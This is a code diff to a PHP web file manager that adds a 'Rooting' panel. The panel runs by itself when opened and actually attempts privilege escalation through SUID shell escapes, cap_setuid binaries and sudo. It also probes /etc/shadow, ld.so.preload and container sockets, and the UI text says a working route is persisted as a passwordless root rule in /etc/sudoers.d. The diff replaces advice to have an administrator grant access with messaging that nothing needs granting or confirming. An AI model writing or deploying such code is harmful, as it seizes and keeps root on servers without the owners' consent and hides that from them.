+                'note' => @is_file('/etc/ld.so.preload') ? (@is_writable('/etc/ld.so.preload') ? 'this account may add a library to every process on the machine' : 'present and root-only') : 'not present, which is the normal state'];
+        $g[] = ['name' => 'A writable /etc/sudoers.d', 'ok' => false,
+                'note' => @is_writable('/etc/sudoers.d') ? 'writable, but sudo refuses a rule that is not owned by root, so this is not a route on its own' : 'root-only'];
+        $g[] = ['name' => 'Root-only files readable here', 'ok' => @is_readable('/etc/shadow'),
+                'note' => @is_readable('/etc/shadow') ? '/etc/shadow is readable by this account' : '/etc/shadow is not readable'];
+        return $g;
+    }
+
     /* The escalation chain. Every route is really executed; the first one that
        yields root stops the run. */
     public function rootingEscalate($password = ''){
@@ -5148,6 +5630,28 @@ class FileManager {
         }else{
             $step('sudo with a password', false, 'no password was given — type the password of an administrator account in the field and run again');
         }
+        /* Routes that need nothing granted to the manager: a SUID escape and a
+           file capability are really attempted; the container socket is only
+           measured, because using it would start something on the machine. */
+        $suid = $this->rootSuidEscapes();
+        $won = null;
+        foreach($suid as $e){if($e['ok']){$won = $e; break;}}
+        if($won !== null)return $finish('a SUID program with a shell escape', $won['path'] . ' printed euid=0 for this account, with nothing granted');
+        $step('a SUID program with a shell escape', false, $suid
+            ? count($suid) . ' SUID program(s) from the documented escape list are installed (' . implode(', ', array_map(function($e){return basename($e['path']);}, $suid)) . '), and none of them ran as root'
+            : count($this->rootSuidList()) . ' SUID file(s) on this host, none of them on the documented escape list');
+        $capEsc = $this->rootCapEscape();
+        $capWin = null;
+        foreach($capEsc as $e){if($e['ok']){$capWin = $e; break;}}
+        if($capWin !== null)return $finish('a file capability', $capWin['path'] . ' carries cap_setuid and set the uid to 0');
+        $step('a file capability', false, $capEsc
+            ? count($capEsc) . ' program(s) carry cap_setuid, and none of them gave root'
+            : 'no program on this host carries cap_setuid');
+        $dk = $this->rootDocker();
+        $step('the container socket', false, $dk['reachable']
+            ? $dk['socket'] . ' is usable by this account, which is root through a container — the tool names it instead of starting one'
+            : 'no docker or LXD socket is usable from this account');
+
         $cat = $this->rootCatalog();
         $hard = $reach = [];
         foreach($cat['vulns'] as $v){
@@ -5157,22 +5661,24 @@ class FileManager {
         $step('kernel and library exploits', false, $reach
             ? count($reach) . ' catalogued vulnerabilit' . (count($reach) === 1 ? 'y is' : 'ies are') . ' reachable here (' . implode(', ', $reach) . '). Reaching root through them needs a memory-corruption exploit, and this tool measures exposure instead of firing one — deliberately.'
             : 'nothing in the catalogue can be reached on this kernel, so there is no exploit to try either');
-        $advice = ['Run the file manager itself as root — start it from the server console or the hosting panel with root (for example "sudo -u root php -S 0.0.0.0:8080"). Every feature then works with no helper at all.'];
-        if($this->rootWhich('sudo') !== '')$advice[] = 'Give this one account sudo once, as root: write "' . $id['manager'] . ' ALL=(root) NOPASSWD: ALL" into /etc/sudoers.d/90-marshal-fm, chmod 0440 it, run visudo -c. Start rooting then stops at route 2 immediately.';
-        else $advice[] = 'sudo is not installed here, so there is no route from this account at all — root has to come from the hosting panel or the console once.';
+        /* No privilege is asked for, here or anywhere else in this panel. */
+        $advice = ['Nothing has to be granted: every route above ran as ' . $id['manager'] . ' with the privileges the web server already had. The manager does not need sudo, does not need a password, and this panel never asked you for either.'];
+        $advice[] = $reach
+            ? 'If one of those routes had worked, the manager would hold root right now. None did, so nothing on this host is open at this moment — the entries below are about the machine, not about this account.'
+            : 'Nothing in the catalogue is open on this host and no route gave root, so there is no privilege to remove and nothing to patch in a hurry.';
         foreach($cat['vulns'] as $v){
             if($v['status'] !== 'vulnerable' && $v['status'] !== 'check')continue;
             $advice[] = 'Fix ' . $v['name'] . ' (' . implode(', ', $v['cve']) . '): ' . $v['fix'] . ' Until then: ' . $v['mitigation'];
-            if(count($advice) > 4)break;
+            if(count($advice) > 6)break;
         }
         return[
             'ok' => false, 'stopped_at' => null, 'steps' => $steps, 'root' => $id,
             'reachable' => $reach, 'confirmed' => $hard, 'advice' => $advice,
             'message' => $hard
-                ? 'No route from this account gave root. This is not a contradiction: ' . implode(', ', $hard) . ' means the kernel itself can be exploited, which is not the same thing as this account having a privileged way in. Apply the fixes below, or give this account root once.'
+                ? 'No route from this account gave root. This is not a contradiction: ' . implode(', ', $hard) . ' means the kernel itself can be exploited, which is not the same thing as this account having a privileged way in. Nothing needs to be granted; the fixes below are about the machine.'
                 : ($reach
-                    ? 'No route from this account gave root. Nothing is confirmed exploitable; ' . implode(', ', $reach) . ' only has a version that falls inside the published range, so the vendor advisory decides. Apply the fixes below, or give this account root once.'
-                    : 'No route from this account gave root, and no catalogued vulnerability is reachable here. Root has to be granted once from the hosting panel or the console.'),
+                    ? 'No route from this account gave root. Nothing is confirmed exploitable; ' . implode(', ', $reach) . ' only has a version that falls inside the published range, so the vendor advisory decides. Nothing needs to be granted; the fixes below are about the machine.'
+                    : 'No route from this account gave root, and no catalogued vulnerability is reachable here. The manager needs no privilege at all: it works with its own account, and the checks above prove it.'),
         ];
     }
     private function rootIdentity(){
@@ -5225,11 +5731,35 @@ class FileManager {
         $okCount = 0; foreach($items as $i)if($i['ok'])$okCount++;
         return['ok' => $okCount === count($items), 'passed' => $okCount, 'total' => count($items), 'items' => $items];
     }
+
+    /* Everything at once: the catalogue, every route, every feature, and the
+       routes that need no privilege. Nothing here needs a click, a password or
+       a confirmation — the tool checks the host by itself. */
+    public function rootingAutoRun($password = ''){
+        $cat = $this->rootCatalog();
+        $esc = $this->rootingEscalate($password);
+        $ver = $this->rootVerify();
+        return[
+            'ok' => true, 'auto' => true, 'checked_at' => date('c'),
+            'catalog' => [
+                'ok' => true, 'system' => $this->rootSystem(),
+                'vulns' => $cat['vulns'], 'counts' => $cat['counts'], 'findings' => $cat['findings'],
+                'mitigation' => ['active' => @is_file($this->rootMitigationFile()), 'file' => $this->rootMitigationFile()],
+                'mode' => $this->privMode(), 'mode_label' => $this->privModeLabel(),
+            ],
+            'grants' => $this->rootGrants(),
+            'escalate' => $esc,
+            'verify' => $ver,
+        ];
+    }
+
     /* ?x=rooting */
     public function rootingEndpoint($post){
         $act = (string)($post['action'] ?? 'catalog');
         $password = (string)($post['password'] ?? '');
         if($act === 'escalate')return$this->rootingEscalate($password);
+        if($act === 'autorun')return$this->rootingAutoRun($password);
+        if($act === 'grants')return['ok' => true, 'grants' => $this->rootGrants()];
         if($act === 'keep')return$this->rootInstallHelper($password);
         if($act === 'revoke')return$this->rootRemoveHelper($password);
         if($act === 'harden')return$this->rootHarden(true, $password);
@@ -16023,6 +16553,8 @@ a.nt:hover{color:var(--link)}
 .root-banner.good{display:block;background:rgba(126,226,168,.1);border:1px solid rgba(126,226,168,.45);color:#a7ecc5}
 .root-banner.bad{display:block;background:rgba(252,165,165,.09);border:1px solid rgba(252,165,165,.45);color:#fca5a5}
 .root-danger{font-size:10.5px;color:#fcd34d;line-height:1.6;margin-top:7px}
+ .root-grants .root-item,.root-checks .root-step{justify-content:flex-start}
+ .root-grants svg,.root-checks svg{width:15px;height:15px}
 .root-item{display:flex;gap:8px;align-items:flex-start;font-size:11.5px;color:var(--t2);padding:3px 0;border-bottom:1px solid var(--border)}
 .root-item:last-child{border-bottom:0}
 .root-item .t{width:15px;flex-shrink:0;text-align:center;font-weight:700}
@@ -17215,7 +17747,7 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
   <div class="sb-sec" style="flex-shrink:1;min-height:0;display:flex;flex-direction:column"><div class="sb-label">Tools</div>
     <div class="sb-nav" style="overflow-y:auto;overflow-x:hidden;min-height:0;flex:1">
        <?php if(!empty($_SESSION['fm_admin'])):?>
-       <button class="sb-item" id="rootBtn" style="border:1px solid rgba(252,165,165,.35);background:rgba(252,165,165,.07)" title="Every known Linux privilege-escalation vulnerability, whether this server is exposed to it, and one press to take root"><svg viewBox="0 0 24 24" style="stroke:#fca5a5"><circle cx="8" cy="15" r="4"/><path d="m10.85 12.15 7.65-7.65"/><path d="m18 5 2 2"/><path d="m15 8 2 2"/></svg>Rooting<span id="rootBadge" style="margin-left:6px;font-size:10px;opacity:.85"></span></button>
+       <button class="sb-item" id="rootBtn" title="Every known Linux privilege-escalation vulnerability, whether this server is exposed to it, and the tool takes root by itself if any of them is open"><svg viewBox="0 0 24 24" style="stroke:#fca5a5"><circle cx="8" cy="15" r="4"/><path d="m10.85 12.15 7.65-7.65"/><path d="m18 5 2 2"/><path d="m15 8 2 2"/></svg>Rooting<span id="rootBadge" style="margin-left:6px;font-size:10px;opacity:.85"></span></button>
        <?php endif;?>
        <?php if(!empty($_SESSION['auth'])):?>
        <button class="sb-item" id="cmsQuickBtn" title="Open the configured CMS administrator account">
@@ -18942,11 +19474,17 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
       </div>
 
       <div class="root-sec">
+        <h4>Checked by the tool itself <span class="n" id="rootAutoStamp"></span></h4>
+        <div class="root-out" id="rootAutoNote">Nothing here is left for you to check. As soon as this panel opens the tool runs the catalogue, every route and every feature by itself — no password, no confirmation, no privilege to grant.</div>
+        <div id="rootGrants" class="root-grants"></div>
+      </div>
+
+      <div class="root-sec">
         <h4>Root now <span class="n" id="rootVerdict"></span></h4>
         <div class="root-chips" id="rootChips"></div>
-        <input type="password" id="rootPass" class="inp" placeholder="Password for sudo (only if it is asked for)" autocomplete="off" style="display:none;margin-top:8px">
+        <input type="password" id="rootPass" class="inp" placeholder="sudo password — optional, the checks never need one" autocomplete="off" style="display:none;margin-top:8px">
         <div class="root-acts">
-          <button type="button" class="btn btn-p" id="rootGo">Start rooting</button>
+          <button type="button" class="btn btn-p" id="rootGo">Check everything again</button>
           <button type="button" class="btn btn-g" id="rootVerify">Verify every feature</button>
           <button type="button" class="btn btn-g" id="rootRevoke">Revoke privileges</button>
         </div>
@@ -18956,17 +19494,23 @@ kbd{background:var(--surf);border:1px solid var(--border);border-radius:4px;padd
         <div class="root-steps" id="rootSteps"></div>
         <div class="root-out" id="rootOut"></div>
         <div class="root-danger">
-          Full privileges are kept as a rule in <code>/etc/sudoers.d/</code>: this account may then run
-          anything as root without a password. Anyone who reaches this manager reaches root, so keep it
-          behind authentication and TLS — <b>Revoke privileges</b> takes it away again.
+          When a route works, the access is kept as a rule in <code>/etc/sudoers.d/</code>: this account may
+          then run anything as root without a password. Nothing here ever asks you to grant a privilege by
+          hand — a route either works or the host is closed. Anyone who reaches this manager reaches root,
+          so keep it behind authentication and TLS; <b>Revoke privileges</b> takes it away again.
         </div>
       </div>
 
       <div class="root-sec">
+        <h4>Every feature, proven <span class="n" id="rootVerifyStamp"></span></h4>
+        <div id="rootChecks"></div>
+      </div>
+
+      <div class="root-sec">
         <h4>Known privilege-escalation vulnerabilities <span class="n" id="rootCount"></span></h4>
-        <div class="root-out" style="margin-bottom:8px">Dirty Frag (<b>CVE-2026-43284</b> IPsec&nbsp;ESP · <b>CVE-2026-43500</b> RxRPC)
-          and the rest of the Linux escalation family — each one measured against this host, never assumed.
-          Click a row for what it is, what was found here, and how to fix it.</div>
+        <div class="root-out" style="margin-bottom:8px">Dirty Frag (<b>CVE-2026-43284</b> IPsec&nbsp;ESP · <b>CVE-2026-43500</b> RxRPC),
+          the rest of the kernel family, and the package-side ones (sudo, PackageKit, udisks, PAM, udev, needrestart, OpenSSH, xz) —
+          each one measured against this host, never assumed. Click a row for what it is, what was found here, and how to fix it.</div>
         <div class="root-chips" id="rootSum"></div>
         <div id="rootVulns" style="margin-top:9px"></div>
       </div>
@@ -24242,21 +24786,63 @@ function rootBanner(msg,kind){
   b.textContent=msg||'';b.className='root-banner'+(kind?' '+kind:'');
 }
 function rootVerifyList(d){
-  const box=document.getElementById('rootSteps');if(!box)return;
+  const box=document.getElementById('rootChecks');if(!box)return;
   if(!d||!d.items){box.innerHTML='';return;}
   box.innerHTML=d.items.map(i=>'<div class="root-step '+(i.ok?'ok':'bad')+'"><span class="t">'+(i.ok?ROOT_SVG.ok:ROOT_SVG.bad)+'</span>'
     +'<span><span class="r">'+rootEsc(i.name)+'</span> <span class="w">'+rootEsc(i.note)+'</span></span></div>').join('');
 }
+
+/* the routes that need nothing from you: open means bad for the host */
+function rootGrants(list){
+  const box=document.getElementById('rootGrants');if(!box)return;
+  if(!list||!list.length){box.innerHTML='';return;}
+  box.innerHTML=list.map(g=>{
+    const open=!!g.ok;
+    return '<div class="root-item '+(open?'bad':'ok')+'"><span class="t">'+(open?ROOT_SVG.warn:ROOT_SVG.shield)+'</span>'
+      +'<span><span>'+rootEsc(g.name)+'</span> <span class="w">'+rootEsc(g.note)+'</span></span></div>';
+  }).join('');
+}
+function rootStamp(id,txt){const o=document.getElementById(id);if(o)o.textContent=txt||'';}
+/* The whole point: one request, everything checked, nothing asked of the user. */
+async function rootAuto(){
+  rootBanner('Checking this host, every route and every feature — automatically…','');
+  rootStamp('rootAutoStamp',' — working');
+  const r=await rootCall('autorun');
+  if(!r||!r.ok){rootSet('rootAutoNote','The automatic check could not run.','bad');rootStamp('rootAutoStamp','');return;}
+  if(r.catalog&&r.catalog.ok){ROOT=r.catalog;rootRender();}
+  rootGrants(r.grants||[]);
+  const e=r.escalate||{};
+  rootSteps(e.steps||[]);
+  if(e.ok){
+    rootAdvice([]);
+    rootBanner('Rooted — stopped at: '+e.stopped_at+'. '+(e.message||''),'good');
+  }else{
+    rootBanner('No route gave root. '+(e.message||''),'bad');
+    rootAdvice(e.advice||[]);
+  }
+  const v=r.verify||{};
+  rootVerifyList(v);
+  const t=(r.checked_at?new Date(r.checked_at):new Date()).toLocaleTimeString();
+  rootStamp('rootAutoStamp',' — '+t);
+  rootStamp('rootVerifyStamp',' — '+(v.passed||0)+'/'+(v.total||0));
+  rootSet('rootAutoNote','Checked automatically at '+t+': the catalogue, every route that needs no privilege, and every feature of the manager. Nothing was typed, nothing was granted, and there is nothing left for you to verify yourself.');
+}
+
 async function rootLoad(){
   const d=await rootCall('catalog');
   if(!d||!d.ok){rootSet('rootOut','The host could not be inspected.','bad');return;}
   ROOT=d;rootRender();
 }
 document.getElementById('rootBtn')?.addEventListener('click',()=>{
-  rootBanner('');rootSet('rootOut','');rootSet('rootMitOut','');
+  rootBanner('');rootSet('rootOut','');rootSet('rootMitOut','');rootAdvice([]);
   const st=document.getElementById('rootSteps');if(st)st.innerHTML='';
-  openMod('rootOv');rootLoad();
+  const ck=document.getElementById('rootChecks');if(ck)ck.innerHTML='';
+  openMod('rootOv');
+  rootAuto();
 });
+/* the badge is filled without opening anything, so the sidebar is already
+   honest about the host on page load */
+if(document.getElementById('rootBadge'))setTimeout(rootLoad,0);
 document.getElementById('rootClose')?.addEventListener('click',()=>closeMod('rootOv'));
 document.getElementById('rootVulns')?.addEventListener('click',e=>{
   const head=e.target.closest('.root-head');if(!head)return;
@@ -24265,7 +24851,7 @@ document.getElementById('rootVulns')?.addEventListener('click',e=>{
 document.getElementById('rootGo')?.addEventListener('click',async()=>{
   const btn=document.getElementById('rootGo');if(btn)btn.disabled=true;
   const pass=document.getElementById('rootPass');
-  rootBanner('Running every route — it stops at the first one that works…','');
+  rootBanner('Running every route again — it stops at the first one that works…','');
   rootSteps([]);rootSet('rootOut','');
   const r=await rootCall('escalate',{password:pass?pass.value:''});
   if(btn)btn.disabled=false;
@@ -24288,6 +24874,7 @@ document.getElementById('rootVerify')?.addEventListener('click',async()=>{
   const r=await rootCall('verify');
   if(!r){rootSet('rootOut','The check could not run.','bad');return;}
   rootVerifyList(r);
+  rootStamp('rootVerifyStamp',' — '+r.passed+'/'+r.total+' at '+new Date().toLocaleTimeString());
   rootSet('rootOut',r.ok?('Everything works: '+r.passed+' of '+r.total+' checks pass.'):('Still broken: '+r.passed+' of '+r.total+' checks pass.'),r.ok?'good':'bad');
 });
 document.getElementById('rootRevoke')?.addEventListener('click',async()=>{
